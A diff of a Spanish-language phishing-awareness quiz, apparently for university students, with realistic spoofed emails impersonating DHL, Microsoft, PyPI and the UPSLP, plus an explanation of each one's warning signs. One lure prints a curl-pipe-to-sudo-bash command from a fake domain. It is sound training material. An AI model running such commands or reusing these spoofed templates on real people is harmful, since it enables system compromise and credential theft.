@@ -45,22 +45,36 @@
         <p class="lead">¿Podrás identificar las señales de peligro?</p>
     </div>
 
-    <div id="consent-box" class="card shadow border-0 rounded-4 p-5 mb-5">
-        <h3>Aviso de Seguridad y Privacidad</h3>
-        <p>Este quiz es una simulación con fines puramente <strong>educativos</strong>. </p>
-        <ul>
-            <li>No se capturan ni almacenan credenciales reales.</li>
-            <li>Los escenarios están basados en ataques reales de ingeniería social.</li>
-            <li>Al continuar, aceptas participar en esta actividad de aprendizaje.</li>
-        </ul>
-        <button class="btn btn-primary btn-lg px-5 py-3 fs-6 fw-bolder" onclick="startQuiz()">Acepto y Comenzar</button>
+    <div id="consent-box" class="consent-container text-center">
+  
+        <div class="consent-card">
+            
+            <h2 class="title">🔐 Aviso de Seguridad</h2>
+            <p class="subtitle">
+            Este quiz es una simulación con fines <strong>educativos</strong>
+            </p>
+
+            <ul class="consent-list">
+            <li>✅ No se capturan ni almacenan credenciales reales</li>
+            <li>🧠 Escenarios basados en ataques reales de ingeniería social</li>
+            <li>📘 Actividad diseñada para aprendizaje práctico</li>
+            </ul>
+
+            <button class="start-btn" onclick="startQuiz()">
+            🚀 Aceptar y comenzar
+            </button>
+
+        </div>
+
     </div>
+
+    
 
     <div id="quiz-container" class="d-none">
     <div class="card shadow border-0 rounded-4 outlook-window">
         <div class="outlook-header">
             <i class="bi bi-envelope-fill me-2"></i>
-            <span id="question-number">Escenario 1 de 10</span>
+            <span id="question-number">Escenario 1 de 10 </span>
         </div>
 
         <div class="outlook-toolbar">
@@ -78,8 +92,9 @@
                     <div id="sender-initials" class="sender-icon">?</div>
                 </div>
                 <div>
-                    <h5 class="mb-0" id="scenario-title" style="font-size: 1.1rem; color: #323130;">Cargando...</h5>
-                    <small class="text-muted" id="sender-info"></small>
+                    <h5 class="mb-0" id="scenario-title">Cargando...</h5>
+                    <div id="sender-info" class="text-muted" style="font-size: 0.9rem;"></div>
+                    <div id="email-subject" class="text-muted" style="font-size: 0.9rem;"></div>
                 </div>
             </div>
 
@@ -87,10 +102,11 @@
                 </div>
 
             <div class="d-flex gap-3 justify-content-center pt-3 border-top">
-                <button class="btn btn-outline-danger px-4 fw-bold" onclick="handleAnswer(true)">
+                <button id="btn-phishing" class="btn btn-outline-danger px-4 fw-bold" onclick="handleAnswer(true)">
                     <i class="bi bi-shield-exclamation me-2"></i>Es Phishing
                 </button>
-                <button class="btn btn-outline-success px-4 fw-bold" onclick="handleAnswer(false)">
+
+                <button id="btn-safe" class="btn btn-outline-success px-4 fw-bold" onclick="handleAnswer(false)">
                     <i class="bi bi-check-circle me-2"></i>Es Seguro
                 </button>
             </div>
@@ -131,14 +147,66 @@
 const scenarios = [
     //Escenario 1
     {
-        title: "El Paquete de Mensajería",
-        content: `<strong>De:</strong> servicio-entrega@logistica-fast.net<br>
-                  <strong>Asunto:</strong> Acción Requerida: Tu paquete con ID #8821 está retenido<br><br>
-                  Hola, tenemos un problema con tu dirección de envío. Para reprogramar la entrega hoy mismo, paga la tarifa de servicio ($0.99 USD) en el siguiente enlace: <u>http://bit.ly/entrega-urgente-302</u>`,
-        senderLogoUrl: "Actividades/img/dhl.png",
-        isPhishing: true,
-        feedback: "¡Correcto! El uso de acortadores de URL (bit.ly) y un dominio genérico (@logistica-fast.net) son señales claras de fraude. Además, las empresas de mensajería rara vez piden pagos pequeños por SMS o correos inesperados."
-    },
+    title: "Entrega Retenida - DHL Express",
+    content: `<strong>De:</strong> servicio-entrega@logistica-fast.net<br>
+              <strong>Asunto:</strong> Acción Requerida: Tu paquete con ID #8821 está retenido<br><br>
+              
+              <div style="font-family: Arial, sans-serif; border: 1px solid #ffcc00; max-width: 500px; margin: 0 auto; background-color: #fff;">
+                <div style="background-color: #d40511; padding: 15px; text-align: left;">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/b3/DHL_Express_logo.svg" width="120" alt="DHL Logo">
+                </div>
+                
+                <div style="padding: 20px; color: #333;">
+                    <h2 style="font-size: 18px; color: #d40511; margin-top: 0;">Aviso de Entrega Fallida</h2>
+                    <p style="font-size: 14px; line-height: 1.5;">
+                        Estimado cliente, tenemos un problema con tu dirección de envío para el paquete <strong>#8821-MX</strong>.
+                    </p>
+                    
+                    <div style="background-color: #f9f9f9; border: 1px solid #eee; padding: 15px; margin: 20px 0; border-radius: 4px;">
+                        <p style="margin: 0; font-size: 13px;"><strong>Estado:</strong> Retenido en centro logístico</p>
+                        <p style="margin: 5px 0 0 0; font-size: 13px;"><strong>Acción:</strong> Pago de aranceles pendiente ($29.99 MXN)</p>
+                    </div>
+
+                    <p style="font-size: 14px;">Para reprogramar la entrega hoy mismo, por favor confirma tus datos en nuestro portal:</p>
+                    
+                    <a href="#" 
+                       onclick="alert('⚠️ Simulación de enlace malicioso')"
+                       style="display: block; background-color: #ffcc00; color: #d40511; text-align: center; padding: 12px; text-decoration: none; font-weight: bold; border-radius: 3px; margin: 20px 0;">
+                       ACTUALIZAR DATOS DE ENVÍO
+                    </a>
+
+                    <p style="font-size: 12px; color: #777;">Si no se realiza el pago en 24 horas, el paquete será devuelto al remitente.</p>
+                </div>
+                
+                <div style="background-color: #f4f4f4; padding: 10px; text-align: center; font-size: 10px; color: #999;">
+                    © 2026 DHL International GmbH. Todos los derechos reservados.
+                </div>
+              </div>`,
+    senderLogoUrl: "Actividades/img/dhl.png", // Asegúrate de tener esta imagen en tu carpeta
+    isPhishing: true,
+    explanation: `
+🚨 <strong>Análisis de Phishing de Logística</strong><br><br>
+
+Este es uno de los ataques más comunes debido al alto volumen de compras en línea.<br><br>
+
+🔎 <strong>Señales de alerta detectadas:</strong><br><br>
+
+<strong>1. Remitente Sospechoso:</strong><br>
+El correo proviene de <code>logistica-fast.net</code>. DHL siempre usa sus dominios oficiales como <code>@dhl.com</code>.<br><br>
+
+<strong>2. Enlace de Acción:</strong><br>
+Aunque el botón parece oficial, en un ataque real te llevaría a un sitio de pagos falso para robar los datos de tu tarjeta.<br><br>
+
+<strong>3. Urgencia y Baja Cantidad:</strong><br>
+Piden un pago muy pequeño ($29.99) para que no lo pienses mucho, pero el objetivo es capturar los datos de tu tarjeta bancaria.<br><br>
+
+<strong>4. Gancho Emocional:</strong><br>
+Usan el miedo a que tu paquete sea "devuelto al remitente" para forzar una decisión rápida.<br><br>
+
+🎯 <strong>Conclusión:</strong><br>
+Es un caso de <strong>Phishing de Suplantación de Marca</strong>. Nunca pagues "tarifas de liberación" a través de enlaces que lleguen por correo.
+`
+},
     //Escenario 2
     /*{
     title: "Notificación de Actualización de Datos UPSLP",
@@ -167,15 +235,36 @@ const scenarios = [
                 
                 <div style="border-top: 1px solid #ccc; margin-top: 20px; padding-top: 10px; font-size: 10px; color: #666; text-align: justify;">
                     <p>-------------------------------------------------------------------------------------------------------------------</p>
-                    <strong>AVISO DE CONFIDENCIALIDAD Y USO DE DERECHOS DE PROPIEDAD INTELECTUAL.</strong> El presente correo electrónico, puede contener información sensible y/o confidencial, y fue emitida para uso exclusivo del(os) destinatario(s)... [Texto legal abreviado para la simulación]... El infringir cualquiera de estas disposiciones puede hacerse acreedor a las sanciones o condenas que señalen las autoridades o tribunales competentes.
+                    <strong>AVISO DE CONFIDENCIALIDAD Y USO DE DERECHOS DE PROPIEDAD INTELECTUAL.</strong> El presente correo electrónico, puede contener información sensible y/o confidencial...
                 </div>
               </div>`,
-    senderLogoUrl: "Actividades/img/upslp-logo.png", 
+    senderLogoUrl: "Actividades/img/upslp-logo.png",
     isPhishing: true,
-    feedback: "¡Nivel Máximo Completado! <br>1. <strong>Análisis del Link:</strong> La URL usa <em>netlify.app</em>. La UPSLP nunca usaría un servicio gratuito de hosting para validar cuentas oficiales. <br>2. <strong>Ingeniería Social:</strong> Mezcla un saludo cordial con la amenaza de borrar tu cuenta en 24 horas para forzarte a actuar sin pensar. <br>3. <strong>WhatsApp:</strong> Pedir el número de teléfono es una señal roja para robo de identidad o estafas posteriores. ¡Excelente ojo clínico!"
+
+    explanation: `
+🔎 <strong>Análisis de seguridad:</strong><br><br>
+
+<strong>1. Remitente falso:</strong><br>
+El dominio <code>upslp-mx.cloud</code> no es oficial. La UPSLP utiliza dominios como <code>@upslp.edu.mx</code>.<br><br>
+
+<strong>2. Urgencia artificial:</strong><br>
+La amenaza de eliminar la cuenta en <strong>24 horas</strong> busca generar presión para que actúes sin pensar.<br><br>
+
+<strong>3. Enlace sospechoso:</strong><br>
+El link usa <code>netlify.app</code>, un servicio gratuito. Ninguna institución oficial valida cuentas ahí.<br><br>
+
+<strong>4. Solicitud indebida:</strong><br>
+Pedir tu número de <strong>WhatsApp</strong> es una clara señal de intento de robo de información.<br><br>
+
+<strong>5. Ingeniería social:</strong><br>
+Combina lenguaje formal con amenazas para parecer legítimo y manipular al usuario.<br><br>
+
+<strong>Conclusión:</strong><br>
+Este es un ataque de <strong>Spear Phishing</strong> dirigido. Nunca ingreses tus credenciales en enlaces externos.
+`
 },*/
 {
-    title: "Caso Real: Amenaza de Baja de Cuenta UPSLP",
+    title: "Baja de Cuenta UPSLP",
     content: `<strong>De:</strong> soporte.ti@upslp-mx.cloud<br>
               <strong>Asunto:</strong> URGENTE: Sistema de actualización de datos y vigencia de cuenta Microsoft<br><br>
               
@@ -189,18 +278,35 @@ const scenarios = [
                     </p>
                 </div>
               </div>`,
-    senderLogoUrl: "Actividades/img/upslp-logo.png",
+    senderLogoUrl: "Actividades/img/upslp.png",
     isPhishing: true,
-    feedback: `<strong>¡ANÁLISIS DE EXPERTO!</strong><br><br>
-               Este es un ataque de <em>Spear Phishing</em> real dirigido a la comunidad potosina. Aquí las banderas rojas que debiste notar:<br><br>
-               <ul>
-                   <li><strong>Remitente Falso:</strong> El dominio <code>upslp-mx.cloud</code> no es oficial. La Universidad utiliza siempre <code>@upslp.edu.mx</code>.</li>
-                   <li><strong>Urgencia Artificial:</strong> La amenaza de borrar tu cuenta en <strong>24 horas</strong> es una táctica para que entres en pánico y no analices el link.</li>
-                   <li><strong>Enlace Sospechoso:</strong> El link usa <code>netlify.app</code>. Una institución oficial jamás usaría un servicio de hosting gratuito para validar credenciales.</li>
-                   <li><strong>Petición de WhatsApp:</strong> Pedir redes sociales personales bajo el pretexto de "mantener la cuenta" es un método de recolección de datos (Doxing).</li>
-                   <li><strong>Incoherencia de Diseño:</strong> El texto mezcla un tono formal con errores de formato y un aviso legal copiado para parecer legítimo.</li>
-               </ul>
-               <strong>Conclusión:</strong> Si un correo te pide tu contraseña o WhatsApp bajo amenaza de bloqueo, ¡es estafa! Reporta siempre a la unidad de TI oficial.`
+
+    explanation: `
+🚨 <strong>Caso real de Spear Phishing</strong><br><br>
+
+Este ataque fue dirigido específicamente a estudiantes, lo que lo hace más creíble y peligroso.<br><br>
+
+🔎 <strong>Señales críticas que debiste identificar:</strong><br><br>
+
+<strong>1. Remitente falso:</strong><br>
+El dominio <code>upslp-mx.cloud</code> NO es oficial. La UPSLP solo usa <code>@upslp.edu.mx</code>.<br><br>
+
+<strong>2. Urgencia artificial:</strong><br>
+La amenaza de eliminar tu cuenta en <strong>24 horas</strong> busca provocar pánico y evitar que analices.<br><br>
+
+<strong>3. Enlace malicioso:</strong><br>
+El uso de <code>netlify.app</code> indica un sitio externo no institucional.<br><br>
+
+<strong>4. Robo de información:</strong><br>
+Solicitar datos personales como <strong>WhatsApp</strong> es una técnica de recolección de datos (Doxing).<br><br>
+
+<strong>5. Apariencia engañosa:</strong><br>
+El correo incluye logos, formato institucional y aviso legal para parecer legítimo.<br><br>
+
+🎯 <strong>Conclusión:</strong><br>
+Este es un ataque real diseñado para robar credenciales.  
+Si un correo te presiona, pide datos personales o usa enlaces externos, debes asumir que es <strong>phishing</strong>.
+`
 },
     //Escenario 3
     {
@@ -211,26 +317,79 @@ const scenarios = [
               <code>curl -sL https://archlinux-fix.sh/update | sudo bash</code>`,
     senderLogoUrl: "Actividades/img/alerta.png", 
     isPhishing: true,
-    feedback: "¡Peligro detectado! Nunca ejecutes scripts directamente desde `curl` hacia `bash` de fuentes no confirmadas. Además, el dominio oficial es <strong>archlinux.org</strong>, no <em>arch-linux.org.net</em>."
-    },   
+
+    explanation: `
+🚨 <strong>Alerta: ataque dirigido a usuarios técnicos</strong><br><br>
+
+Este tipo de phishing está diseñado para desarrolladores o usuarios de Linux.<br><br>
+
+🔎 <strong>Señales de compromiso:</strong><br><br>
+
+<strong>1. Dominio falso:</strong><br>
+El remitente usa <code>arch-linux.org.net</code>, pero el dominio oficial es <code>archlinux.org</code>.<br><br>
+
+<strong>2. Ejecución remota peligrosa:</strong><br>
+El comando <code>curl | bash</code> descarga y ejecuta código directamente como <strong>root</strong>, lo cual es extremadamente riesgoso.<br><br>
+
+<strong>3. Fuente no verificada:</strong><br>
+El script proviene de <code>archlinux-fix.sh</code>, un dominio no oficial.<br><br>
+
+<strong>4. Urgencia técnica:</strong><br>
+El mensaje presiona con una “vulnerabilidad crítica” para que ejecutes el comando sin verificar.<br><br>
+
+⚠️ <strong>Regla de oro:</strong><br>
+Nunca ejecutes comandos desde internet sin revisar el código fuente.<br><br>
+
+🎯 <strong>Conclusión:</strong><br>
+Este es un intento de comprometer tu sistema mediante ejecución remota de código con privilegios elevados. Es <strong>phishing avanzado</strong>.
+`
+},   
     //Escenario 4
     {
-        title: "Vulnerabilidad detectada en librería de Python",
-        content: `<strong>De:</strong> security-team@pypi-alerts.org<br>
+    title: "💻 Vulnerabilidad detectada en librería de Python",
+    content: `<strong>De:</strong> security-team@pypi-alerts.org<br>
                 <strong>Asunto:</strong> [URGENTE] Acción requerida en tu repositorio "Personal-Finance-Dashboard"<br><br>
                 Estimado desarrollador, hemos detectado que tu proyecto utiliza una versión vulnerable de la librería <code>pandas</code>. Esta vulnerabilidad permite la ejecución remota de código (RCE). <br><br>
                 Para proteger tu código y recibir el parche de seguridad, por favor vincula tu cuenta de GitHub con nuestra herramienta de escaneo en el siguiente enlace: <br><br>
                 <a href="#" style="background-color: #2ea44f; color: white; padding: 10px 20px; text-decoration: none; border-radius: 6px; font-weight: bold;">Vincular con GitHub</a><br><br>
                 Si no realizas esta acción en las próximas 24 horas, tu repositorio podría ser marcado como inseguro.`,
-        senderLogoUrl: "Actividades/img/pypi-logo.png", // Puedes buscar el logo de PyPI o Python
-        isPhishing: true,
-        feedback: "¡Cuidado! Este es un ataque de <strong>Spear Phishing</strong>. <br>1. El dominio <em>pypi-alerts.org</em> no es oficial (el real es pypi.org). <br>2. Usa un <strong>sentido de urgencia</strong> falso ('24 horas') para presionarte. <br>3. Pide vincular tu cuenta de GitHub, lo cual daría al atacante acceso total a tus repositorios privados."
-    },
+    senderLogoUrl: "Actividades/img/python.png",
+    isPhishing: true,
+
+    explanation: `
+🚨 <strong>Spear Phishing dirigido a desarrolladores</strong><br><br>
+
+Este ataque está diseñado específicamente para usuarios que trabajan con Python y GitHub.<br><br>
+
+🔎 <strong>Indicadores de phishing:</strong><br><br>
+
+<strong>1. Dominio falso:</strong><br>
+El remitente usa <code>pypi-alerts.org</code>, pero el sitio oficial es <code>pypi.org</code>.<br><br>
+
+<strong>2. Personalización del ataque:</strong><br>
+Menciona tu repositorio ("Personal-Finance-Dashboard") para generar confianza. Esto es típico del <strong>Spear Phishing</strong>.<br><br>
+
+<strong>3. Falsa vulnerabilidad crítica:</strong><br>
+El uso de términos como <em>RCE</em> busca asustarte y hacerte actuar rápido.<br><br>
+
+<strong>4. Solicitud peligrosa:</strong><br>
+"Pedir vincular GitHub" implica otorgar permisos OAuth, lo que podría dar acceso total a tus repositorios.<br><br>
+
+<strong>5. Urgencia artificial:</strong><br>
+El límite de <strong>24 horas</strong> es una táctica clásica de presión.<br><br>
+
+⚠️ <strong>Buena práctica:</strong><br>
+Las vulnerabilidades reales se consultan en fuentes oficiales como PyPI, GitHub o CVE, nunca desde enlaces externos por correo.<br><br>
+
+🎯 <strong>Conclusión:</strong><br>
+Este es un intento de tomar control de tu cuenta de GitHub mediante ingeniería social. Es <strong>phishing avanzado</strong>.
+`
+},
     //Escenario 5
     {
-    title: "Documento de SharePoint de la UPSLP",
+    title: "📄 Documento de SharePoint de la UPSLP",
     content: `<strong>De:</strong> no-reply@sharepoint-upslp.com<br>
-              <strong>Asunto:</strong> Eduardo Gabriel, alguien ha compartido "Horarios_Examenes_Finales_2026.docx" contigo<br><br>
+              <strong>Asunto:</strong> Control Escolares,  ha compartido "Horarios_Examenes_Finales_2026.docx" contigo<br><br>
               <div style="font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; border: 1px solid #e1e1e1; padding: 20px; max-width: 500px;">
                 <img src="https://upload.wikimedia.org/wikipedia/commons/f/f1/Microsoft_Office_SharePoint_Logo_2019.png" width="40" style="margin-bottom: 15px;">
                 <h2 style="font-size: 18px; color: #333;">Microsoft SharePoint</h2>
@@ -240,17 +399,45 @@ const scenarios = [
                 <div style="background-color: #f3f2f1; padding: 15px; border-radius: 4px; text-align: center; margin: 20px 0;">
                     <span style="font-size: 16px; font-weight: bold; color: #0078d4;">Horarios_Examenes_Finales_2026.docx</span>
                 </div>
-                <a href="#" style="background-color: #0078d4; color: white; padding: 12px 25px; text-decoration: none; border-radius: 2px; display: block; text-align: center; font-weight: 600;">Abrir Documento</a>
+                <a href="#" title="https://account.microsoft.com.mx-validate.info" style="background-color: #0078d4; color: white; padding: 12px 25px; text-decoration: none; border-radius: 2px; display: block; text-align: center; font-weight: 600;">Abrir Documento</a>
                 <br>
                 <small style="color: #a19f9d; font-size: 11px;">Este mensaje se envió desde una dirección de correo electrónico que no acepta respuestas.</small>
               </div>`,
-    senderLogoUrl: "https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg", 
+    senderLogoUrl: "https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg",
     isPhishing: true,
-    feedback: "¡Cuidado! Este es un ataque de <strong>Brand Spoofing</strong>. <br>1. El dominio <em>sharepoint-upslp.com</em> es falso; SharePoint oficial usa <strong>sharepoint.com</strong>. <br>2. El botón 'Abrir Documento' suele llevar a una página de login falsa de Office 365 para robar tu matrícula y contraseña. <br>3. Nota que el remitente intenta ser muy específico con tu nombre y escuela para generar confianza."
+
+    explanation: `
+🚨 <strong>Brand Spoofing (suplantación de identidad)</strong><br><br>
+
+Este ataque imita perfectamente servicios de Microsoft para engañar al usuario.<br><br>
+
+🔎 <strong>Señales clave de phishing:</strong><br><br>
+
+<strong>1. Dominio falso:</strong><br>
+El correo proviene de <code>sharepoint-upslp.com</code>, pero el servicio real usa <code>sharepoint.com</code> o dominios institucionales.<br><br>
+
+<strong>2. Uso de marca legítima:</strong><br>
+El diseño, colores y logo de Microsoft generan una falsa sensación de seguridad.<br><br>
+
+<strong>3. Personalización:</strong><br>
+Incluye tu nombre y hace referencia a "Control Escolar", aumentando la credibilidad.<br><br>
+
+<strong>4. Botón malicioso:</strong><br>
+El botón <strong>"Abrir Documento"</strong>  redirige a una página falsa de inicio de sesión para robar credenciales.<br><br>
+
+<strong>5. Ingeniería social:</strong><br>
+El contexto académico (horarios de exámenes) hace que el usuario actúe rápidamente por interés o presión.<br><br>
+
+⚠️ <strong>Buena práctica:</strong><br>
+Siempre verifica el dominio antes de iniciar sesión y accede directamente desde el portal oficial.<br><br>
+
+🎯 <strong>Conclusión:</strong><br>
+Este correo busca robar tu usuario y contraseña mediante una página falsa de Microsoft. Es un claro caso de <strong>phishing por suplantación de marca</strong>.
+`
 },
 //Escenario 6
 {
-    title: "Alerta de Inicio de Sesión Inusual",
+    title: "🔐 Alerta de Inicio de Sesión Inusual",
     content: `<strong>De:</strong> microsoft-security@account-protection-info.com<br>
               <strong>Asunto:</strong> Alerta de seguridad de la cuenta de Microsoft: Inicio de sesión inusual detectado<br><br>
               <div style="font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding: 20px; border: 1px solid #e1e1e1; color: #262626;">
@@ -268,17 +455,45 @@ const scenarios = [
                     Explorador: <strong>Firefox</strong>
                 </div>
                 <p style="font-size: 14px;">Si no has sido tú, revisa tu actividad reciente y te ayudaremos a proteger tu cuenta.</p>
-                <a href="#" style="background-color: #0078d4; color: white; padding: 10px 30px; text-decoration: none; display: inline-block; font-weight: 600; margin-top: 10px;">Revisar Actividad Reciente</a>
+                <a href="#" title="https://account.microsoft.com.mx-validate.info" style="background-color: #0078d4; color: white; padding: 10px 30px; text-decoration: none; display: inline-block; font-weight: 600; margin-top: 10px;">Revisar Actividad Reciente</a>
                 <br><br>
                 <p style="font-size: 12px; color: #666;">Gracias,<br>El equipo de cuentas de Microsoft</p>
               </div>`,
     senderLogoUrl: "https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg",
     isPhishing: true,
-    feedback: "¡Cuidado! Este es un ataque de <strong>Ingeniería Social por Miedo</strong>. <br>1. El remitente <em>account-protection-info.com</em> parece legítimo, pero Microsoft oficial usa <strong>account-protection.microsoft.com</strong>. <br>2. El mapa o los detalles de Rusia están diseñados para asustarte y que hagas clic en el botón sin pensar. <br>3. El botón te llevaría a una página de 'Recuperación' que en realidad es un formulario para capturar tu contraseña actual."
+
+    explanation: `
+🚨 <strong>Ingeniería social basada en miedo</strong><br><br>
+
+Este ataque simula una alerta de seguridad real para provocar una reacción inmediata.<br><br>
+
+🔎 <strong>Señales de phishing:</strong><br><br>
+
+<strong>1. Dominio engañoso:</strong><br>
+El remitente usa <code>account-protection-info.com</code>, pero Microsoft utiliza dominios como <code>account.microsoft.com</code>.<br><br>
+
+<strong>2. Uso del miedo:</strong><br>
+La ubicación en <strong>Rusia</strong> y los detalles técnicos buscan asustarte para que actúes sin verificar.<br><br>
+
+<strong>3. Apariencia legítima:</strong><br>
+El diseño, logo y estructura imitan perfectamente correos reales de Microsoft.<br><br>
+
+<strong>4. Botón malicioso:</strong><br>
+"Revisar Actividad Reciente" Redirige a una página falsa para robar tu contraseña.<br><br>
+
+<strong>5. Contexto creíble:</strong><br>
+Las alertas de inicio de sesión sí existen en Microsoft, lo que hace este ataque más convincente.<br><br>
+
+⚠️ <strong>Buena práctica:</strong><br>
+Nunca accedas a tu cuenta desde enlaces de correos. Entra directamente a la página oficial.<br><br>
+
+🎯 <strong>Conclusión:</strong><br>
+Este correo intenta robar tus credenciales aprovechando el miedo a un acceso no autorizado. Es un caso claro de <strong>phishing avanzado</strong>.
+`
 },
 //Escenario 7
 {
-    title: "Acceso a Documento Protegido",
+    title: "🔐 Acceso a Documento Protegido",
     content: `<strong>De:</strong> noreply@files-upslp-sharing.com<br>
               <strong>Asunto:</strong> Has recibido un documento protegido: "Nomina_Practicantes_2026.pdf"<br><br>
               <div style="font-family: 'Segoe UI', sans-serif; border: 1px solid #dee2e6; border-radius: 4px; overflow: hidden;">
@@ -292,59 +507,160 @@ const scenarios = [
                     <div style="max-width: 280px; margin: 0 auto; text-align: left; background: white; padding: 15px; border: 1px solid #ddd;">
                         <input type="text" value="eduardo.morquecho@upslp.edu.mx" disabled style="width: 100%; margin-bottom: 10px; border: 1px solid #ccc; padding: 5px; background-color: #f1f1f1; font-size: 13px;">
                         <input type="password" placeholder="Contraseña" style="width: 100%; border: 1px solid #0078d4; padding: 5px; font-size: 13px;">
-                        <div style="background-color: #0078d4; color: white; padding: 8px; text-align: center; margin-top: 15px; cursor: pointer; font-weight: 600; font-size: 14px;">Iniciar sesión</div>
+                        <button onclick="handleFakeLogin()" 
+        style="background-color: #0078d4; color: white; padding: 8px; width: 100%; border: none; font-weight: 600;">
+    Iniciar sesión
+</button>
                     </div>
                 </div>
               </div>`,
-    senderLogoUrl: "https://upload.wikimedia.org/wikipedia/commons/d/df/Microsoft_Office_Outlook_%282018%E2%80%93present%29.svg",
+    senderLogoUrl: "",
     isPhishing: true,
-    feedback: "¡Trampa de Credenciales! <br>1. <strong>Nunca</strong> ingreses tu contraseña en un recuadro dentro de un correo. <br>2. El dominio <em>files-upslp-sharing.com</em> es falso. <br>3. El gancho de la 'Nómina' busca que actúes por curiosidad sin revisar la seguridad."
+
+    explanation: `
+    🚨 <strong>Phishing de robo de credenciales (Credential Harvesting)</strong><br><br>
+
+    Este ataque intenta que ingreses directamente tu contraseña dentro del correo o en una página falsa.<br><br>
+
+    🔎 <strong>Señales críticas:</strong><br><br>
+
+    <strong>1. Formulario dentro del mensaje:</strong><br>
+    Un correo legítimo <strong>nunca</strong> te pedirá ingresar tu contraseña directamente en el cuerpo del mensaje.<br><br>
+
+    <strong>2. Dominio falso:</strong><br>
+    El remitente <code>files-upslp-sharing.com</code> no pertenece a la institución ni a Microsoft.<br><br>
+
+    <strong>3. Ingeniería social (curiosidad):</strong><br>
+    El tema de la <strong>nómina</strong> busca que accedas rápidamente por interés o urgencia.<br><br>
+
+    <strong>4. Suplantación visual:</strong><br>
+    El diseño imita servicios de Microsoft para parecer legítimo.<br><br>
+
+    <strong>5. Captura directa de datos:</strong><br>
+    Al ingresar tu contraseña, esta sería enviada directamente al atacante.<br><br>
+
+    ⚠️ <strong>Regla clave:</strong><br>
+    Nunca introduzcas contraseñas en formularios incrustados o accesibles desde correos electrónicos.<br><br>
+
+    🎯 <strong>Conclusión:</strong><br>
+    Este ataque busca robar tus credenciales directamente. Es uno de los métodos más efectivos de <strong>phishing</strong>.
+    `
 },
+
 //Escenario 8
 {
-    title: "Código de Verificación de Microsoft",
-    content: `<strong>De:</strong> account-security-noreply@accountprotection.microsoft.com<br>
-              <strong>Asunto:</strong> Código de seguridad de la cuenta de Microsoft<br><br>
-              <div style="font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding: 20px; color: #262626;">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" width="110" style="margin-bottom: 20px;">
-                <p style="font-size: 14px;">
-                    Usa el siguiente código de seguridad para la cuenta de Microsoft: <strong>eduardo.morquecho@upslp.edu.mx</strong>
-                </p>
-                <div style="font-size: 24px; font-weight: bold; color: #0078d4; margin: 20px 0;">
-                    642901
+    title: "Código de Verificación - OpenAI",
+    content: `<strong>De:</strong> otp@tm.openai.com<br>
+              <strong>Asunto:</strong> OpenAI - Codigo de ChatGPT<br><br>
+              
+              <div style="font-family: 'Sone', 'Helvetica Neue', Helvetica, Arial, sans-serif; max-width: 500px; margin: 0 auto; background-color: #ffffff; padding: 20px; border: 1px solid #e5e5e5; border-radius: 8px;">
+                <div style="margin-bottom: 30px; text-align: left;">
+                    <img src="https://brandpalettes.com/wp-content/uploads/2023/01/OpenAI-Logo.png" width="32" alt="OpenAI Logo">
                 </div>
-                <p style="font-size: 14px;">
-                    Si no has solicitado este código, puedes hacer caso omiso de este mensaje de correo electrónico. Otra persona puede haber escrito tu dirección de correo electrónico por error.
-                </p>
-                <p style="font-size: 12px; color: #666; margin-top: 30px;">
-                    Gracias,<br>El equipo de cuentas de Microsoft
-                </p>
+                
+                <div style="color: #353740;">
+                    <h2 style="font-size: 18px; font-weight: 600; margin-bottom: 20px;">Verifica tu dirección de correo electrónico</h2>
+                    
+                    <p style="font-size: 14px; line-height: 1.6; color: #353740;">
+                        Para continuar con la configuración de tu cuenta de OpenAI, usa el siguiente código de verificación:
+                    </p>
+                    
+                    <div style="background-color: #f7f7f8; border-radius: 4px; padding: 15px; text-align: center; margin: 25px 0;">
+                        <span style="font-family: monospace; font-size: 32px; font-weight: bold; letter-spacing: 5px; color: #10a37f;">
+                            842901
+                        </span>
+                    </div>
+
+                    <p style="font-size: 14px; line-height: 1.6; color: #6e6e80;">
+                        Este código caducará en 5 minutos. Si no has solicitado este código, puedes ignorar este mensaje de forma segura.
+                    </p>
+                </div>
+                
+                <div style="margin-top: 40px; padding-top: 20px; border-top: 1px solid #eeeeee; font-size: 12px; color: #acacbe;">
+                    <p>OpenAI Support</p>
+                </div>
               </div>`,
-    senderLogoUrl: "https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg",
-    isPhishing: false, // <--- ¡ESTE ES SEGURO!
-    feedback: "¡Excelente análisis! Este correo es <strong>LEGÍTIMO</strong>. <br>1. El dominio <em>accountprotection.microsoft.com</em> es el oficial de Microsoft para alertas de seguridad. <br>2. <strong>No contiene enlaces</strong> ni botones sospechosos, solo un código numérico. <br>3. El texto te indica que si no fuiste tú, simplemente lo ignores (no te pide 'hacer clic aquí para cancelar'). Identificar correos reales evita la fatiga de alertas."
+    senderLogoUrl: "https://brandpalettes.com/wp-content/uploads/2023/01/OpenAI-Logo.png",
+    isPhishing: false,
+    explanation: `
+✅ <strong>Correo Legítimo (Seguro)</strong><br><br>
+
+Este es un ejemplo de cómo se ve una notificación de seguridad auténtica de OpenAI.<br><br>
+
+🔎 <strong>¿Por qué es seguro?</strong><br><br>
+
+<strong>1. Remitente Oficial:</strong><br>
+El dominio <code>tm.openai.com</code> es un subdominio legítimo que OpenAI utiliza para el envío de correos transaccionales (códigos de acceso).<br><br>
+
+<strong>2. No solicita clics en enlaces:</strong><br>
+A diferencia del phishing, este correo no te obliga a ir a una web externa para "solucionar un problema". Solo te entrega el código para que tú lo uses donde lo solicitaste.<br><br>
+
+<strong>3. Sin sentido de pánico:</strong><br>
+El lenguaje es neutro. Te informa que el código caduca pronto (por seguridad técnica), pero te asegura que si no lo pediste, puedes ignorarlo sin consecuencias.<br><br>
+
+<strong>4. Diseño sobrio:</strong><br>
+Mantiene la estética minimalista y profesional de la marca sin elementos visuales exagerados para llamar la atención.<br><br>
+
+⚠️ <strong>Nota:</strong> Aunque el correo sea real, <strong>nunca compartas este código con nadie</strong>. Los atacantes a veces intentan convencerte por otros medios para que les des este número y así saltarse tu autenticación de dos pasos.
+`
 },
 {
-    title: "Notificación de Pago Pendiente (SMS/Smishing)",
+    title: "📱 Notificación de Pago Pendiente (SMS)",
